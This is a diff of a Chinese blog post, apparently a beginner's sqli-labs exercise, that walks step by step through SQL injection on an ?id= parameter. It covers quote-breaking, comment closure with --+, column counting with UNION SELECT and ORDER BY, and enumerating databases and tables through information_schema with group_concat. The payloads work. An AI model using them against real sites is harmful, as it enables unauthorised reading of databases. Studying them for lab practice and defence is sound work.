@@ -94,18 +94,18 @@
 
 
 
-<meta name="description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）这告诉我们需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=0’ union  select 1,2,3–+  或者 ?id=">
+<meta name="description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）我们要加引号的话需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=1’ union  select 1,2,3–+  或者 ?">
 <meta name="keywords" content="sql.fun">
 <meta property="og:type" content="article">
 <meta property="og:title" content="好玩的sql第一篇">
 <meta property="og:url" content="http://yoursite.com/2017/09/19/sql-1/index.html">
 <meta property="og:site_name" content="hhd">
-<meta property="og:description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）这告诉我们需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=0’ union  select 1,2,3–+  或者 ?id=">
+<meta property="og:description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）我们要加引号的话需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=1’ union  select 1,2,3–+  或者 ?">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-09-22T08:47:29.422Z">
+<meta property="og:updated_time" content="2017-10-15T04:52:45.193Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="好玩的sql第一篇">
-<meta name="twitter:description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）这告诉我们需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=0’ union  select 1,2,3–+  或者 ?id=">
+<meta name="twitter:description" content="第一步：?id=1正常显示 第二步：?id=1’显示错误：LIMIT 0,1’ 这表示切片（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）我们要加引号的话需要将后面的注释掉 第三步：?id=1’–+利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释 第四步：?id=1’ union  select 1,2,3–+  或者 ?">
 
 
 
@@ -340,10 +340,12 @@
 
       
         <p>第一步：?id=1<br>正常显示</p>
-<p>第二步：?id=1’<br>显示错误：LIMIT 0,1’ 这表示切片<br>（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）<br>这告诉我们需要将后面的注释掉</p>
+<p>第二步：?id=1’<br>显示错误：LIMIT 0,1’ 这表示切片<br>（注：select * from tablename limit 2,4 即取出第3条至第6条，4条记录）<br>我们要加引号的话需要将后面的注释掉</p>
 <p>第三步：?id=1’–+<br>利用–+将其闭合，考虑到URL编码问题，这里无法用/**/多行注释</p>
-<p>第四步：?id=0’ union  select 1,2,3–+  或者 ?id=0’ union select * from users order by猜解<br>测试关于字段的个数</p>
-<p>第五步：?id=0’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>最后查看所有库，也可以加些其他操作…由于本人小白，就不多说了…</p>
+<p>第四步：?id=1’ union  select 1,2,3–+  或者 ?id=1’ order by 3猜解<br>测试关于字段的个数，从返回结果看出是否正确。</p>
+<p>第五步：?id=0’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>查看所有库，information_schema.schemata这个表里面列举了所有数据库的名字，存放在schema_name这个字段里面。</p>
+<p>第六步：?id=0%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27–+<br>查看information_schema.tables这个表里面，table_schema元组=’security’的所有table_name这个字段。</p>
+<p>哈哈，你猜今天是几月几号呀</p>
 
       
     </div>
@@ -374,8 +376,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/17/ctf-web-5/" rel="next" title="ctf.web.5">
-                <i class="fa fa-chevron-left"></i> ctf.web.5
+              <a href="/2017/09/17/文件包含小解/" rel="next" title="文件包含小解">
+                <i class="fa fa-chevron-left"></i> 文件包含小解
               </a>
             
           </div>
@@ -384,8 +386,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/09/20/sql-5/" rel="prev" title="好玩的sql第五篇">
-                好玩的sql第五篇 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/20/ctf-web-6/" rel="prev" title="ctf.web.6">
+                ctf.web.6 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -456,7 +458,7 @@
             
               <a href="/archives">
             
-                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-count">23</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
